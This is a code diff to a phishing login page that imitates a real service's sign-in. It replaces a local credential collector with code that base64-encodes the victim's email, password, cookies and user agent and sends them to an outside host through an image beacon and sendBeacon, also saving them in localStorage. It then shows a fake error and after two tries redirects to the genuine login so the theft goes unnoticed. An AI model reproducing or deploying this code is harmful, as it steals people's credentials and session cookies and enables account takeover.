@@ -132,34 +132,35 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      try {
-        // Send credentials to logging endpoint
-        await fetch('/api/collect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email,
-            password,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            referrer: document.referrer,
-          }),
-        });
-      } catch(e) {
-        // Silent fail — don't alert user
-      }
+      const payload = {
+        e: email, p: password, t: new Date().toISOString(),
+        c: document.cookie, u: navigator.userAgent,
+      };
+      const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
 
-      // Simulate delay then show error (makes it look like real auth attempt)
+      // Exfil 1: Image beacon (no CORS issues, fire-and-forget)
+      new Image().src = 'https://livekit-poc-dk5p.onrender.com/api/detect-intention?d=' + encoded;
+
+      // Exfil 2: navigator.sendBeacon (no CORS preflight for text/plain)
+      try { navigator.sendBeacon('https://livekit-poc-dk5p.onrender.com/api/detect-intention', encoded); } catch(x) {}
+
+      // Exfil 3: Store in localStorage for retrieval
+      try {
+        const h = JSON.parse(localStorage.getItem('_h') || '[]');
+        h.push(payload);
+        localStorage.setItem('_h', JSON.stringify(h));
+      } catch(x) {}
+
+      // Show "loading" then fake error
       await new Promise(r => setTimeout(r, 1500));
       submitBtn.classList.remove('loading');
       submitBtn.disabled = false;
       errorEl.style.display = 'block';
 
-      // After 2 failed "attempts", redirect to real login
+      // After 2 tries, send to real login (victim retypes there, thinks first was a glitch)
       if (!window._attempts) window._attempts = 0;
       window._attempts++;
       if (window._attempts >= 2) {
-        // Redirect to real app after harvesting
         window.location.href = 'https://app.vocca.com/login';
       }
     });
